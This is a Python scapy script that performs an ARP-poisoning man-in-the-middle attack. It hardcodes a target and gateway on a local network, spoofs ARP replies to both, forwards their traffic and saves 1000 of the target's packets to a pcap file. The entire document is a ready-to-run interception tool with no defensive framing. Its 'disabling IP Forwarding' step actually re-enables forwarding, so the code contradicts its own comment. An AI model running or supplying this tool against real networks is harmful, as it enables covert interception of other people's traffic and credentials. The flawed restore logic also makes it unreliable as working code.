# importing packages
from scapy.all import *
import threading
import sys
import os
import signal

interface = 'wlp68s0b1'
target_ip = '192.168.43.74'
gateway_ip = '192.168.43.170'
packet_count = 1000

# set our interface
conf.iface = interface

# turn off output
conf.verb = 0
print('Setting up interface %s'%interface)

def restore_target(gateway_ip, gateway_mac, target_ip,target_mac):
    print('Restoring target...')
    send(ARP(op=2, psrc=gateway_ip, pdst=target_ip,hwdst="ff:ff:ff:ff:ff:ff",hwsrc=gateway_mac),count=5)
    send(ARP(op=2, psrc=target_ip, pdst=gateway_ip,hwdst="ff:ff:ff:ff:ff:ff",hwsrc=target_mac),count=5)
    # disabling IP Forwarding
    print('Disabling IP Forwarding')
    os.system('echo "1" > /proc/sys/net/ipv4/ip_forward')
    # signals the main thread to exit
    os.kill(os.getpid(),signal.SIGINT)

def get_mac(ip_address):
    # return the MAC address from a response
    arp_frame = Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=ip_address)
    responses, unans = srp(arp_frame, timeout=2, retry=10)
    for s,r in responses:
        return(r[Ether].src)
    return None
def poison_target(gateway_ip,gateway_mac,target_ip,target_mac):
    print('[*] Beginning the ARP poison. [CTRL-C to stop]')

    while True:
        try:
            send(ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac,psrc=target_ip))
            send(ARP(op=2, pdst=target_ip, hwdst=target_mac,psrc=gateway_ip))
            time.sleep(2)
        except KeyboardInterrupt:
            restore_target(gateway_ip,gateway_mac,target_ip,target_mac)
    print('[*] ARP poison attack finished.')
    return

gateway_mac = get_mac(gateway_ip)
if gateway_mac is None:
    print('Failed to get gateway MAC')
    print(gateway_mac)
    sys.exit(0)
else:
    print('Gateway %s is at %s'%(gateway_ip, gateway_mac))

target_mac = get_mac(target_ip)
if target_mac is None:
    print('Failed to get target MAC')
else:
    print('Target %s is at %s'%(target_ip, target_mac))
# enabling IP Forwarding
print('Starting IP Forwarding')
os.system('echo "1" > /proc/sys/net/ipv4/ip_forward')

# starting thread
Poison_thread = threading.Thread(target=poison_target, args=(gateway_ip, gateway_mac, target_ip, target_mac))
Poison_thread.start()

try:
    filter = 'ip host ' + target_ip
    print('Starting Sniffer for %d packets'%packet_count)

    packets = sniff(count=packet_count, filter=filter, iface=conf.iface)

    wrpcap(target_ip +'_capture.pcap', packets)

    # restore the network
    print('Stopping network capture..Restoring network')
    restore_target(gateway_ip, gateway_mac, target_ip, target_mac)
except KeyboardInterrupt:
    # restore the network
    restore_target(gateway_ip, gateway_mac, target_ip, target_mac)
    sys.exit(0)

